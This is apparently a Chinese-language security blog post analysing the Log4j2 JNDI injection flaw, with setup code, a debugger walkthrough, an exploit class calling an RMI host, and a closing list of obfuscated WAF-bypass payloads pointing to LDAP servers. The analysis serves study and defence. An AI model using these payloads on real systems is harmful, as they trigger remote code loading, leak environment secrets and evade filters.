# Log4j2漏洞分析

  
  
&lt;!--more--&gt;  
## 0x01 Log4j2基础开发学习  
log4j和log4j2都是日志管理工具，相比于log4j、log4j2一步步变的越来越主流，现在市场很多项目都是slf4j&#43;log4j2  
实现Log4j2的组件应用，先是`Pom.xml`  
```xml  
&lt;dependency&gt;    
 &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;    
 &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;    
 &lt;version&gt;2.14.1&lt;/version&gt;    
&lt;/dependency&gt;     
&lt;dependency&gt;    
 &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;    
 &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;    
 &lt;version&gt;2.14.1&lt;/version&gt;    
&lt;/dependency&gt;    
&lt;dependency&gt;    
 &lt;groupId&gt;junit&lt;/groupId&gt;    
 &lt;artifactId&gt;junit&lt;/artifactId&gt;    
 &lt;version&gt;4.12&lt;/version&gt;    
 &lt;scope&gt;test&lt;/scope&gt;    
&lt;/dependency&gt;  
```  
先用简单的xml的方式来实现，文件如下  
```xml  
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;    
  
&lt;configuration status=&#34;info&#34;&gt;      
 &lt;Properties&gt;    
 &lt;Property name=&#34;pattern1&#34;&gt;[%-5p] %d %c - %m%n&lt;/Property&gt;    
 &lt;Property name=&#34;pattern2&#34;&gt;    
 =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n    
        &lt;/Property&gt;    
 &lt;Property name=&#34;filePath&#34;&gt;logs/myLog.log&lt;/Property&gt;    
 &lt;/Properties&gt;    
 &lt;appenders&gt; &lt;Console name=&#34;Console&#34; target=&#34;SYSTEM_OUT&#34;&gt;    
 &lt;PatternLayout pattern=&#34;${pattern1}&#34;/&gt;    
 &lt;/Console&gt; &lt;RollingFile name=&#34;RollingFile&#34; fileName=&#34;${filePath}&#34;    
 filePattern=&#34;logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz&#34;&gt;    
 &lt;PatternLayout pattern=&#34;${pattern2}&#34;/&gt;    
 &lt;SizeBasedTriggeringPolicy size=&#34;5 MB&#34;/&gt;    
 &lt;/RollingFile&gt;   
	&lt;/appenders&gt;   
	&lt;loggers&gt;   
		&lt;root level=&#34;info&#34;&gt;    
 &lt;appender-ref ref=&#34;Console&#34;/&gt;    
 &lt;appender-ref ref=&#34;RollingFile&#34;/&gt;    
 &lt;/root&gt;   
&lt;/loggers&gt;  
&lt;/configuration&gt;  
```  
写一个Demo  
```java  
import org.apache.logging.log4j.LogManager;    
import org.apache.logging.log4j.Logger;    
    
import java.util.function.LongFunction;    
    
public class Log4j2Test01 {    
    public static void main( String[] args )    
    {    
        Logger logger = LogManager.getLogger(LongFunction.class);    
        logger.trace(&#34;trace level&#34;);    
        logger.debug(&#34;debug level&#34;);    
        logger.info(&#34;info level&#34;);    
        logger.warn(&#34;warn level&#34;);    
        logger.error(&#34;error level&#34;);    
        logger.fatal(&#34;fatal level&#34;);    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408041954212.png)
  
### 实际开发场景  
现在的代码是我们封装的一个行为，一般日志文件还是需要输出的。然后实际应用的话。  
比如我从数据库获取到了一个`username`为`huahua`，我要把它登陆进来的信息打印到日志里面，这个路径一般有一个`/logs`的文件夹的。  
demo  
```java  
import org.apache.logging.log4j.LogManager;    
import org.apache.logging.log4j.Logger;    
    
import java.util.function.LongFunction;    
    
public class RealEnv {    
    public static void main(String[] args) {    
        Logger logger = LogManager.getLogger(LongFunction.class);    
    
        String username = &#34;huahua&#34;;    
        if (username != null) {    
            logger.info(&#34;User {} login in!&#34;, username);    
        }    
        else {    
            logger.error(&#34;User {} not exists&#34;, username);    
        }    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408041955243.png)
## 0x02 Log4j2漏洞分析  
### 影响版本  
2.x&lt;=log4j&lt;=2.15.0-rc1  
### 漏洞原理  
`username`这个参数是可以控制的`logger.info(&#34;User {} login in!&#34;, username);`  
在这里，尝试输入一下其他的  
将`username`修改为`String username = &#34;${java:os}&#34;;`，在跑一下看看  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408042127462.png)
直接打印出了我们操作系统的一些信息。看一下官方文档的解释  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408042127050.png)
按照官网上面的api来看，并不会造成安全漏洞  
但是这里的lookup是基于jndi的，而jndi是存在注入漏洞的，直接调用`lookup()`是会存在漏洞的  
## 0x03 漏洞复现与EXP  
在知道漏洞原理的情况下，直接写exp  
```java  
import org.apache.logging.log4j.LogManager;    
import org.apache.logging.log4j.Logger;    
    
import java.util.function.LongFunction;    
    
public class log4j2EXP {    
    public static void main(String[] args) {    
        Logger logger = LogManager.getLogger(LongFunction.class);    
    
        String username = &#34;${jndi:rmi://192.168.2.1:1099/ln5ex5}&#34;;    
    
        logger.info(&#34;User {} login in!&#34;, username);    
    }    
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051038826.png)
## 0x04 调试分析  
下个断点在`PatternLayout`这个类下的`toSerializable()`方法。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051055479.png)
往下走，是一个循环，遍历`formatters`一段段拼接输出的内容，  
两个传进去进行处理的变量一个是`event`，也就是我们`log4j2`需要来进行日志打印的内容；另外一个`buffer`，我们会把打印出来的东西写进`buffer`。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051059615.png)
跟进`format()`方法，这个`format()`方法可以当作是处理字符串的一个方法。  
因为这是一个循环遍历`formatters`的，中间会做很多数据处理的工作，有一个地方很重要，当`i=7`的时候进入到了另一个`format`处理方法，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051103897.png)
进入到这个`format()`方法里面后，先判断是否是`Log4j2`的`lookups`功能。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051107227.png)
继续往下走，会遍历`workingBuilder`来进行判断；如果`workingBuilder`中存在`${`，那么就会取出从`$`开始直到最后的字符串，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051110674.png)
`workingBuilder`的内容如下，其实结构也比较清晰方法名，日志级别，当前类名，然后就是`payload`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051112380.png)
上图的`value`就是我们输入的pyaload`${jndi:rmi://192.168.2.1:1099}`  
跟进`replace()`方法，`replace()`方法里面调用了`substitute()`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051114810.png)
进入到这里  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051115525.png)
继续往下走，直到进入到`while`循环里面，在`while`循环中，会对字符串进行逐字匹配`${`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051117586.png)
然后进行循环读取，直到读取到`}`并获取其坐标，然后将`${}`中间的内容取出来，然后又会调用`this.subtitute`来处理  
运行`subtitute`的时候，由于已经没有了`${}`所以，直接来到了下面，将`varName`作为变量传入`resolveVariable`函数  
varName 就是为`${}`中的值  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051125036.png)
可以猜测`resolver`解析时支持的关键词有`[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]`，而我们这里利用的`jndi:xxx`后续就会用到`JndiLookup`这个解析器  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051127589.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051127419.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051129666.png)
这里看到`resolveVariable()`方法里面是调用了`lookup()`方法，这个`lookup()`方法也就是`jndi`里面原生的方法，在我们让`jndi`去调用`ldap`服务的时候，是调用原生的`lookup()`方法的，是存在漏洞的。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202408051131494.png)
这里就是常规的jndi注入点，会进行命令执行  
### 总结  
1、先判断内容是否有`${}`，然后截取`${}`中的内容，得到恶意payload jndi:xxx  
2、使用:分割payload，通过前缀来判断使用何种解析器去`lookup`  
3、支持的前缀包括`date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j`  
### 奇淫技巧  
主要是读取敏感信息，GoogleCTF2022 的 log4j2 的题目中，有一种非预期的方式就是通过这种方式打的  
刚才分析了其他解析器功效，通过`sys`和`env`协议，结合`jndi`可以读取到一些环境变量和系统变量，特定情况下可能可以读取到系统密码  
## 0x05 针对WAF的绕过  
### 1、利用分隔符和多个`${}`绕过  
`logg.info(&#34;${${::-J}ndi:ldap://127.0.0.1:1389/Calc}&#34;);`  
### 2、通过lower和upper绕过  
这一点，因为我们之前说允许的字段是这一些    
`date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j`，其中就有 lower 和 upper  
  
同时也可以利用 lower 和 upper 来进行 bypass 关键字  
```  
logg.info(&#34;${${lower:J}ndi:ldap://127.0.0.1:1389/Calc}&#34;);  
logg.info(&#34;${${upper:j}ndi:ldap://127.0.0.1:1389/Calc}&#34;);  
....  
```  
### 3、总结一些payload  
```  
${${a:-j}ndi:ldap://127.0.0.1:1234/ExportObject};  
    
${${a:-j}n${::-d}i:ldap://127.0.0.1:1234/ExportObject}&#34;;  
    
${${lower:jn}di:ldap://127.0.0.1:1234/ExportObject}&#34;;  
    
${${lower:${upper:jn}}di:ldap://127.0.0.1:1234/ExportObject}&#34;;  
    
${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1234/ExportObject}&#34;;  
```  
  
## Reference  
https://wjlshare.com/archives/1677  

---

> Author: N1Rvana  
> URL: http://localhost:1313/log4j2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/  

